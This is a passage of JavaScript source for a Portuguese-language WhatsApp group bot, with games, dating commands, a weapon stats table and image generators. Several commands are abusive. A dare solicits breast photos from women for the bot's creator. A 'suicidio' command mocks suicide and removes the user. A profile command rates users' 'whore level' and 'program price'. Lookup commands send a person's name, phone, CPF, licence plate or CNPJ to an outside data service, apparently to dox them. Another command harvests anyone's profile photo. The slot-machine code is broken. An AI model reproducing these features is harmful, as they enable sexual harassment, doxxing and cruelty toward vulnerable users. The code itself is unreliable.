'Desafio você a fazer um salto de bungee jumping 🌉',
'Desafio você a escalar uma montanha 🧗',
'Desafio você a correr uma meia maratona 🏃',
'Desafio você a experimentar uma comida exótica 🦗',
'Desafio você a aprender a tocar um instrumento em um mês 🎸',
'Desafio você a acampar sozinho(a) em um lugar isolado ⛺',
'Desafio você a fazer um discurso em um evento importante 🎙️',
'Desafio você de preferência gênero feminino a mandar fototeta no pv do meu criador rsrs🤭',
];
const desafio = desafios[Math.floor(Math.random() * desafios.length)];
reply(`• 𝘦𝘶  𝘵𝘦 𝘥𝘦𝘴𝘢𝘧𝘪𝘰 !\n [ ${desafio} ] \n • 𝘤𝘢𝘴𝘰 𝘯𝘢𝘰 𝘧𝘢𝘤̧𝘢 𝘰 𝘥𝘦𝘴𝘢𝘧𝘪𝘰 𝘪𝘳𝘦𝘪 𝘤𝘢𝘳𝘪𝘮𝘣𝘢𝘳 𝘴𝘶𝘢 𝘱𝘢𝘴𝘴𝘢𝘨𝘦𝘮 😈`);
}
break;

case 'vab':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  

reagir(from, "🤨")

const questions  = JSON.parse(fs.readFileSync('./arquivos/json/vab.json'));
const { pergunta1, pergunta2 } = questions[Math.floor(Math.random() * questions.length)]
sendPoll(from, "Você prefere..", [pergunta1, pergunta2]).catch(console.error);
break



case 'eununca':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(msg.modobn)   
reagir(from, "🤨")
const pergunta_ = JSON.parse(fs.readFileSync('./arquivos/json/eununca.json'));
const getRandomINever = pergunta_[Math.floor(Math.random() * pergunta_.length)]
sendPoll(from, getRandomINever, ["Eu já", "Eu nunca"]).catch(console.error);
break

case 'gf':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)   
if(!menc_os2 || menc_jid2[1]) return reply('marque a pessoa que você quer fazer gf, a mensagem ou o @')
amy.sendMessage(from, {video: {url: "https://telegra.ph/file/f3bb46b98fb57436a1413.mp4"}, gifPlayback: true, caption: `Você fez um GF gostoso com a(o) @${menc_os2.split('@')[0]} 😈🔥` , mentions: [menc_os2]}, {quoted: info})
break

case 'cassino':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (!isGroup) return reply('Voce so pode jogar em grupos')
reagir(from, "🎰")
await sleep(600)
 const soto = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍇',
'🍊 : 🍋 : 🔔',
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : 🍊',
'🍊 : 🍋 : 🍊',		
'🍐 : 🍒 : 🍋',
'🍐 : 🍐 : 🍐',
'🍊 : 🍒 : 🍒',
'🔔 : 🔔 : 🍇',
'🍌 : 🍒 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍌',
'🔔 : 🔔 : 🍇',
'🔔 : 🍐 : 🍇',
'🔔 : 🔔 : 🔔',
'🍒 : 🍒 : 🍒',
'🍌 : 🍌 : 🍌'
]		
const mining = Math.ceil(Math.random() * 1000) +1
const somtoy2 = exportion[Math.floor(Math.random() * exportion.length)]
if ((somtoy2 == '🥑 : 🥑 : 🥑') ||(somtoy2 == '🍉 : 🍉 : 🍉') ||(somtoy2 == '🍓 : 🍓 : 🍓') ||(somtoy2 == '🍎 : 🍎 : 🍎') ||(somtoy2 == '🍍 : 🍍 : 🍍') ||(somtoy2 == '🥝 : 🥝 : 🥝') ||(somtoy2 == '🍑 : 🍑 : 🍑') ||(somtoy2 == '🥥 : 🥥 : 🥥') ||(somtoy2 == '🍋 : 🍋 : 🍋') ||(somtoy2 == '🍐 : 🍐 : 🍐') ||(somtoy2 == '🍌 : 🍌 : 🍌') ||(somtoy2 == '🍒 : 🍒 : 🍒') ||(somtoy2 == '🔔 : 🔔 : 🔔') ||(somtoy2 == '🍊 : 🍊 : 🍊') ||(somtoy2 == '🍇 : 🍇 : 🍇')) {
var Vitória = `▱▰▱▰▱▰ ★ ▱▰▱▰▱▰
 ☲ ►  Voce ganhou🔮  ◄☲
▱▰▱▰▱▰ ★ ▱▰▱▰▱▰`

} else {
var Vitória = `▱▰▱▰▱▰ ★ ▱▰▱▰▱▰
 ☲ ►    Voce perdeu...    ◄☲
▱▰▱▰▱▰ ★ ▱▰▱▰▱▰`
}
	const cassino = `
   ۣۜۜ͜͡☆ ☲ ► 𝐂𝐀𝐒𝐒𝐈𝐍𝐎 ◄☲  ☆ۣۜۜ͜͡
╭╸╸╸╸╸╸╸🎰╸╸╸╸╸╸╸╮
 ۣۜۜ͜͡☆ ☲ ► ${somtoy2} ◄☲ ☆ۣۜۜ͜͡   
╰╸╸╸╸╸╸╸🎰╸╸╸╸╸╸╸╯

*${Vitória}*`
reply(cassino)
if (Vitória == `▱▰▱▰▱▰ ★ ▱▰▱▰▱▰
 ☲ ►   Você ganhou...🎊   ◄☲
▱▰▱▰▱▰ ★ ▱▰▱▰▱▰`) {

reply('Parabéns')
}
await (sender)
break

case 'suicidio':
case 'suicídio':
setTimeout(() => {reagir(from, `🥺`)}, 100)
{
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
reply(`🥺 Lembre-se ${pushname} você sempre estara em nossos corações! ☔😔`)
await sleep(3000)
amy.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(1000)
reply('Agora que ja se foi vamos falar mal dele')
}
break

case 'namorar': case 'pediremnamoro':
if(!isGroup) return reply(`> `+reply.msg.grupo)

if(!menc_os2) return reply('Marque a mensagem ou o @ que queira pedir ela em namoro. Se você tomar um fora, juízo!')

if(numeroBot.includes(menc_os2)) return reply("Não é possível pedir o bot em namoro, seu baitola.🙄")

if(JSON.stringify(namoro2).includes(menc_os2)) return reply(`Este usuário já foi pedido em namoro...`)

if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return reply(`Essa pessoa já pediu alguém em namoro... Sinto muito ${pushname} 😕`)

if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return reply(`Não será possível pedir essa pessoa em namoro, pois a mesma já está com outro(a). 🌚`)

if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return mention(`Você já pediu para namorar com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}. Não brinque com os sentimentos dos outros! Se decida logo ou digite: ${prefix}cancelarpedido`)

if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return mention(`Você já está namorando com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}...`)

namoro1.push({usu1: sender, usu2: menc_os2.split('@')[0], namorados: false, idgp: from, hora: hora, data: date})

fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.push({id: menc_os2, pedido: sender.split('@')[0], idgp: from})

fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))

amy.sendMessage(from, {video: {url: `https://telegra.ph/file/cc313adcf306bf602c695.mp4`}, gifPlayback: true, caption: `Querido *@${menc_os2.split('@')[0]}*, o(a) *@${sender.split('@')[0]}* deixou uma *cartinha* para você!\n–\n“Saber que você é parte da minha vida me faz sentir abençoado. Desde o primeiro dia em que me aproximei de você, sabia que havia algo especial ali. Agora, depois de tanto tempo, quero declarar oficialmente nosso amor.”\n–\nEai você aceita namorar com *@${sender.split('@')[0]}* e viver um felizes para sempre?\n• Para aceitar o pedido, digite: “Sim”\n• Para recusar o pedido, digite: “Não”.`, mentions: [menc_os2, sender]})
break

case 'cancelarpedido':
if(!isGroup) return reply(`> `+reply.msg.grupo)

if(!JSON.stringify(namoro1).includes(sender)) return reply("Não há pedido de namoro para cancelar.")

C13 = namoro1.map(i => i.usu1).indexOf(sender)

C15 = namoro2.map(i => i.id).indexOf(namoro1[C13].usu2 + "@s.whatsapp.net")

if(namoro1[C13].namorados == true) return reply("Não é possível cancelar o pedido de namoro depois de aceito.")

namoro1.splice(C13, 1)

fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C15, 1)

fs.writeFileSync("./database/func/namoro2.json", JSON.stringify(namoro2))

reply("Pedido de namoro cancelado com sucesso.")

break

case 'terminar':
// @Matheus
if(!JSON.stringify(namoro1).includes(sender)) return reply(`Você não está namorando com ninguém. Sinto muito!`)

D1 = namoro1.map(i => i.usu1).indexOf(sender)
D2 = namoro1.map(a => a.usu1).indexOf(`${namoro1[D1].usu2}@s.whatsapp.net`)
namoro1[D2].namorados = false
reply(`*Agora você está totalmente solteiro seu desgraçado(a) gosta de brincar com sentimentos, ja avisei seu parceiro sobre o término* 😑`)
amy.sendMessage(`${namoro1[D1].usu2}@s.whatsapp.net`, {text: `Tenho uma notícia ruim sobre seu namoro, ele(a) acaba de terminar.\n–\n• Seja feliz e lembre dos todos os bons momentos que vocês tiveram juntos.`}, {quoted: info})
namoro1.splice(D2, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.splice(D1, 1)
fs.writeFileSync("./database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
break

case 'minhadupla': case 'dupla':
// @Matheus
if(!isGroup) return reply(reply.msg.grupo)
if(!JSON.stringify(namoro1).includes(sender)) return reply(`Você não está namorando com ninguém. Sinto muito!`)
reagir(from, "❤️‍🩹")
D1 = namoro1.map(i => i.usu1).indexOf(sender)
if(namoro1[D1].namorados == false) return reply(`A pessoa que você pediu em namoro não aceitou o pedido ainda. Portanto, não é possível consultar os dados da dupla.️`)
txt = `@${namoro1[D1].usu1.split('@')[0]} namora com @${namoro1[D1].usu2}\n–\n• O pedido de namoro ocorreu às ${namoro1[D1].hora} do dia ${namoro1[D1].data}.\n–\n• Para realizar o término do namoro, use: *${prefix}terminar*`
mencionarIMG(txt, "https://telegra.ph/file/6ccd40ca7d42bd6f8d6f5.jpg")
break

//╸╸╸╸╸╸╸╸𝙈𝙀𝙉𝙐 𝙑𝙄𝙋╸╸╸╸╸╸╸╸╸╸



case 'cronometro': case 'cronômetro':

async function CronZ(txt) {
const totalTime = 10 * 59;

function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

let { key } = await amy.sendMessage(from, { text: `${txt} ${txt.length > 0 ? "\n" : ""}Tempo restante: 10:00` }, { quoted: info });
for (let i = totalTime - 1; i >= 0; i--) {
const minutes = Math.floor(i / 59);
const seconds = i % 59;
const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
await sleep(2000);
amy.sendMessage(from, { text: `${txt} ${txt.length > 0 ? "\n" : ""}\n> Tempo restante: ${timeString}`, edit: key }, { quoted: info });
}
await amy.sendMessage(from, { text: `${txt.length > 0 ? "\n" : ""}Finalizado!` }, { quoted: info });
}

CronZ('<<<< Mensagem Cronometro >>>>');
break
    


//╸╸╸╸╸╸╸╸╸╸╸𝙈𝙀𝙉𝙐18╸╸╸╸╸╸╸╸╸╸╸╸╸

case 'nome':
case 'telefone':
case 'cpf':
case 'cpf2':
case 'placa':
case 'cnpj':
if (!q) return reply('Informe o dado que deseja consultar após o comando.');
reply('Consultando...');
const consulta = await fetchJson(`https://api.cariflex.xyz/api/consulta/${command}?query=${q}`);
if (consulta.file) {
const resultado = Buffer.from(consulta.base64, 'base64'); 
await amy.sendMessage(from, { document: resultado, fileName: `${q}.txt`, mimetype: 'text/plain' });
}
else {
if (consulta.resultado) {
await amy.sendMessage(from, { text: consulta.resultado });
}
}
break;
    
case 'plaq1': 
case 'plaq2':
case 'plaq3':
case 'plaq4':
case 'plaq5':
case 'plaq6':
case 'plaq7':
case 'plaq8':
case 'plaq9':
case 'plaq10':
if(!q) return reply(`informe o seu nome`)
reply(" Sua plaquinha esta sendo enviada no pv")
plaq = await getBuffer(`https://api.cariflex.xyz/api/${command}?q=${q}`)
await amy.sendMessage(sender, 
{image: plaq}, 
{quoted: info}).catch(e => {
reply('Erro ao fazer sua plaquinha')
})
break


// Menu membros cases //

case 'perfil':
try {
ppimg = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
 ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}
try { 

var conselho2 = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
🗒 *Nome* : *${pushname}*
🪀 *Número* : @${sender.split("@")[0]}
🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
📱 *Seu Célular* : ${info.key.id.length > 21 ? 'Android 🤣' : info.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅'}
😈 *Nível puta* : *${putar}${putar2}%*
😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
🍼 *Valor do programa* : *R$${programa}*`
amy.sendMessage(from, {image: {url: ppimg}, caption: dptr, mentions: [sender]}, {quoted: info})
} catch (e) {
console.log(e)
}
break


case 'roubarfoto':
    let user2;

    // Verifica se o comando foi usado com um número
    const commandArgs = budy.trim().split(" ");
    if (commandArgs.length > 1) {
        // Usa o número informado após o comando
        user2 = `${commandArgs[1]}@s.whatsapp.net`;
    } 
    // Caso contrário, verifica se é uma resposta a uma mensagem
    else if (info.message.extendedTextMessage?.contextInfo?.quotedMessage) {
        user2 = info.message.extendedTextMessage.contextInfo.participant;
    } 
    // Caso não tenha sido uma resposta, verifica se há menções
    else if (info.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
        user2 = info.message.extendedTextMessage.contextInfo.mentionedJid[0];
    } 
    // Se não for uma resposta, menção ou número, usa o remetente
    else {
        user2 = sender;
    }

    try {
        var ppimg = await amy.profilePictureUrl(user2, 'image');
    } catch {
        var ppimg = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'; // Imagem padrão caso não haja foto
    }

    let username2 = user2.split("@")[0];
    amy.sendMessage(sender, {
        image: { url: ppimg },
        caption: `*_🎭 A foto de perfil do(a)_* *@${username2}:*`,
        mentions: [user2]
    }, { quoted: info });
    break;

case "arma":
if(!isGroup) return reply(reply.msg.grupo)
{
bancoDeDados = {
"M1887": {
"nome": "M1887",
"descrição": "Uma espingarda de cano duplo que inflige danos massivos em curta distância.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AK47": {
"nome": "AK47",
"descrição": "Rifle de assalto de alta potência com alta taxa de disparo e precisão moderada.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"AWM": {
"nome": "AWM",
"descrição": "Rifle de precisão capaz de derrubar inimigos com um único tiro.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"Groza": {
"nome": "Groza",
"descrição": "Rifle de assalto altamente poderoso com uma taxa de disparo e precisão excepcionais.",
"dano": "Alto",
"alcance": "Médio",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"UMP45": {
"nome": "UMP45",
"descrição": "Submetralhadora de alta cadência de tiro, equilibrada em termos de dano e controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 25
},
"M1014": {
"nome": "M1014",
"descrição": "Uma espingarda de combate próxima com uma taxa de disparo e dano impressionantes.",
"dano": "Muito alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 6
},
"M60": {
"nome": "M60",
"descrição": "Metralhadora com alto poder de fogo, ideal para suprimir inimigos e combates a média distância.",
"dano": "Alto",
"alcance": "Médio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 60
},
"XM8": {
"nome": "XM8",
"descrição": "Rifle de assalto de alta eficiência, com ótimo equilíbrio entre dano, alcance e taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"SCAR": {
"nome": "SCAR",
"descrição": "Rifle de assalto confiável, com boa precisão e controle de recuo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 30
},
"M4A1": {
"nome": "M4A1",
"descrição": "Rifle de assalto versátil e equilibrado, adequado para várias situações de combate.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 30
},
"SVD": {
"nome": "SVD",
"descrição": "Rifle de precisão semi-automático, com ótimo alcance e dano significativo.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"MP5": {
"nome": "MP5",
"descrição": "Submetralhadora compacta e precisa, adequada para combates em espaços confinados.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"SPAS12": {
"nome": "SPAS12",
"descrição": "Uma espingarda de ação por bombeamento, eficaz a curta distância com alto dano.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 6
},
"KAR98K": {
"nome": "KAR98K",
"descrição": "Rifle de precisão de ação por ferrolho, com excelente precisão e dano letal.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"M249": {
"nome": "M249",
"descrição": "Metralhadora leve com grande capacidade de munição, ideal para controle de área.",
"dano": "Alto",
"alcance": "Médio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 100
},
"Thompson": {
"nome": "Thompson",
"descrição": "Submetralhadora clássica de alta cadência de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"VSS": {
"nome": "VSS",
"descrição": "Rifle de assalto silencioso com escopo integrado e baixo recuo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 15
},
"MP40": {
"nome": "MP40",
"descrição": "Submetralhadora de alta cadência de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"AUG": {
"nome": "AUG",
"descrição": "Rifle de assalto com excelente precisão, alcance e taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"G18": {
"nome": "G18",
"descrição": "Pistola automática com alta taxa de disparo, ideal para combate próximo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 20
},
"P90": {
"nome": "P90",
"descrição": "Submetralhadora de alta cadência de tiro e capacidade de munição elevada.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 50
},
"Desert Eagle": {
"nome": "Desert Eagle",
"descrição": "Pistola de alta potência e precisão, com uma grande parada de energia.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 7
},
"Vector": {
"nome": "Vector",
"descrição": "Submetralhadora compacta com alta cadência de tiro e boa precisão.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"M14": {
"nome": "M14",
"descrição": "Rifle semiautomático de alta precisão, ideal para combates de longa distância.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"CG15": {
"nome": "CG15",
"descrição": "Rifle de sinalização que causa dano explosivo aos inimigos.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"USP": {
"nome": "USP",
"descrição": "Pistola de médio alcance com boa precisão e taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 12
},
"M1873": {
"nome": "M1873",
"descrição": "Revólver de ação simples com alto dano, mas taxa de disparo baixa.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AN94": {
"nome": "AN94",
"descrição": "Rifle de assalto com um modo de disparo especial que aumenta a taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"M79": {
"nome": "M79",
"descrição": "Lançador de granadas que causa danos em área com alto poder de explosão.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"M14": {
"nome": "M14",
"descrição": "Rifle semiautomático de alta precisão, ideal para combates de longa distância.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
},
"CG15": {
"nome": "CG15",
"descrição": "Rifle de sinalização que causa dano explosivo aos inimigos.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"USP": {
"nome": "USP",
"descrição": "Pistola de médio alcance com boa precisão e taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 12
},
"M1873": {
"nome": "M1873",
"descrição": "Revólver de ação simples com alto dano, mas taxa de disparo baixa.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"AN94": {
"nome": "AN94",
"descrição": "Rifle de assalto com um modo de disparo especial que aumenta a taxa de disparo.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Alta",
"capacidade_do_pente": 30
},
"M79": {
"nome": "M79",
"descrição": "Lançador de granadas que causa danos em área com alto poder de explosão.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"M82B": {
"nome": "M82B",
"descrição": "Rifle de precisão de ação por ferrolho com alto dano e capacidade de penetração.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"P90": {
"nome": "P90",
"descrição": "Submetralhadora de alta cadência de tiro e capacidade de munição elevada.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 50
},
"Desert Eagle": {
"nome": "Desert Eagle",
"descrição": "Pistola de alta potência e precisão, com uma grande parada de energia.",
"dano": "Alto",
"alcance": "Curto",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 7
},
"M1887": {
"nome": "M1887",
"descrição": "Espingarda de ação por ferrolho com alto dano em combates de curta distância.",
"dano": "Extremo",
"alcance": "Curto",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 2
},
"XM8": {
"nome": "XM8",
"descrição": "Rifle de assalto com boa precisão e cadência de tiro.",
"dano": "Moderado",
"alcance": "Médio",
"taxa_de_disparo": "Média",
"capacidade_do_pente": 30
},
"KAR98K": {
"nome": "KAR98K",
"descrição": "Rifle de precisão de ação por ferrolho com alto dano e precisão.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 5
},
"M79": {
"nome": "M79",
"descrição": "Lançador de granadas que causa danos em área com alto poder de explosão.",
"dano": "Extremo",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 1
},
"MP40": {
"nome": "MP40",
"descrição": "Submetralhadora de alta cadência de tiro e bom controle de recuo.",
"dano": "Moderado",
"alcance": "Curto",
"taxa_de_disparo": "Muito alta",
"capacidade_do_pente": 30
},
"M14": {
"nome": "M14",
"descrição": "Rifle semiautomático de alta precisão, ideal para combates de longa distância.",
"dano": "Alto",
"alcance": "Longo",
"taxa_de_disparo": "Baixa",
"capacidade_do_pente": 10
}
}
const armaPesquisada = args.join(" "); // Substitua pelo valor desejado
let resultado = null;
for (const arma in bancoDeDados) {
if (arma.toLowerCase() === armaPesquisada.toLowerCase()) {
resultado = bancoDeDados[arma];

break;
}
}
if (resultado) {
resultado = `Arma: ${resultado.nome}\n*${resultado.descrição}*\n\nDano: *${resultado.dano}*\n\nAlcance: *${resultado.alcance}*\n\nTaxa de disparo: *${resultado.taxa_de_disparo}*\n\nCapacidade do pente: *${resultado.capacidade_do_pente}*`
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/098e3ff71f1f65ff88e84.jpg' }, caption: resultado}, {quoted: info})
} 
else {
reply('Esta arma nao foi encontrada no meu banco de dados');

}
} 
break

case 'gerarnick': case'nick':
if (!q) return reply(`informe o nome do seu nick`)
reagir(from,`🆙`) 
try {
var nick = await fetchJson(`https://api.cariflex.xyz/api/fazernick?nome=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/U5beetu.jpeg`}, caption: `${nick}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'report':
case 'bug':
if (!q) return reply('informe o comando que esta com bug')
reply(`${pushname} Obrigado pela sua colaboração, o bug foi reportado ao meu desenvolvedor.\nAgarde assim que possível o bug sera resolvido\n<❌> bug falso nao sera respondido !`)
const report = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
let templateMesssage = {
image: {url: `${report}`,
quoted: info},
caption: `      ❗ UM BUG REPORTADO ❗\nUSUARIO: @${sender.split('@')[0]},\nBUG:${q}`,
footer: 'Noelle_md'
}
amy.sendMessage("559691542453@s.whatsapp.net",templateMesssage)
break

case 'novocmd':
if (!q) return reply('Informe o comando que voce quer que seja adicionado no bot.')
reply(`${pushname} Obrigado pela sua ideiq, ela foi enviada ao meu desenvolvedor.😊`)
const comad = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
let templateMessage = {
image: {url: `${comad}`,
quoted: info},
